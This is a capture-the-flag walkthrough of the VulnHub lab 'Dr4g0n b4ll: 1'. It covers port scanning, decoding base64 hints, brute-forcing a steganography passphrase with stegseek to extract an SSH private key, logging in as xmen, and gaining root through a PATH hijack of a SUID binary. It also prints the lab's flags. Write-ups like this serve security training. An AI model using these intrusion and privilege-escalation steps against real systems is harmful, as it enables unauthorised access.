# Dr4g0n b4ll: 1

2024-6-14 https://www.vulnhub.com/entry/dr4g0n-b4ll-1,646/

difficulty: Easy

## IP

192.168.10.198

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 b5774c88d727541c561d48d9a41e2891 (RSA)
|   256 c6a8c89eed0d671faead6bd5ddf157a1 (ECDSA)
|_  256 faa9b0e3062b9263ba112f94d63190b2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: DRAGON BALL | Aj's
```

http://192.168.10.198/robots.txt 显示的信息经过 2 次 base64 解码，显示 you find the hidden dir

http://192.168.10.198/ 首页上没什么信息，查询源码，在最底部发现提示: VWtaS1FsSXdPVTlKUlVwQ1ZFVjNQUT09 , 经过 3 次 base64 解码，显示 DRAGON BALL

看看 DRAGON BALL 是不是 web 上的目录，还带个空格比较奇怪:

```
http://192.168.10.198/DRAGON%20BALL/
```

得到一个 secret.txt 文件:

```
http://192.168.10.198/DRAGON%20BALL/secret.txt

/facebook.com
/youtube.com
/google.com
/vanakkam nanba
/customer
/customers
/taxonomy
/username
/passwd
/yesterday
/yshop
/zboard
/zeus
/aj.html
/zoom.html
/zero.html
/welcome.html
```

可以是密码字典，但是也有可能是 web 的目录名，尝试用 gobuster 按此目录扫描没有，那估计就是密码字典了。

另外有一个 vulnhub 的目录，里面有一个图片和 html 文件：

```
http://192.168.10.198/DRAGON%20BALL/Vulnhub/aj.jpg
```

html 页面没有提交入口，是个静态的：

```
http://192.168.10.198/DRAGON%20BALL/Vulnhub/login.html#
```

先看看这个 aj.jpg 的图片有没有隐写，steghide 没有找到，需要输入密码，使用 stegseek 尝试进行爆破找到密码：

```
stegseek --crack aj.jpg ~/tools/dict/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "love"
[i] Original filename: "id_rsa".
[i] Extracting to "aj.jpg.out".
```

发现密码为 love 并且其中压缩了 id_rsa, 有了私钥，需要一个用户名，在 html 的首页上看到 WELCOME TO xmen ，猜测用户名可能是 xmen 尝试 ssh 登陆：

```
ssh -i id_rsa xmen@192.168.10.198
```

登陆成功。

发现 user flag:

```
xmen@debian:~$ cat local.txt
your falg :192fb6275698b5ad9868c7afb62fd555
```

在 scripts 中发现 suid 程序 shell , 并且有源码 demo.c

```
xmen@debian:~/script$ cat demo.c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("ps");
}
```

发现 ps 没有使用绝对路径，可以在当前路径使用 bash 替换 ps，然后在 PATH 中将当前路径加入到 PATH:

```
cd /tmp
cp /usr/bin/bash ./ps
export PATH=/tmp:$PATH
/home/xmen/script/shell

root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(xmen)
root@debian:/tmp# cd /root
root@debian:/root# ls
proof.txt
root@debian:/root# cat proof.txt

   _____ __________
  /     \\______   \          ___  ___ _____   ____   ____
 /  \ /  \|       _/          \  \/  //     \_/ __ \ /    \
/    Y    \    |   \           >    <|  Y Y  \  ___/|   |  \
\____|__  /____|_  /__________/__/\_ \__|_|  /\___  >___|  /
        \/       \/_____/_____/     \/     \/     \/     \/

join channel:   https://t.me/joinchat/St01KnXzcGeWMKSC

your flag: 031f7d2d89b9dd2da3396a0d7b7fb3e2
```
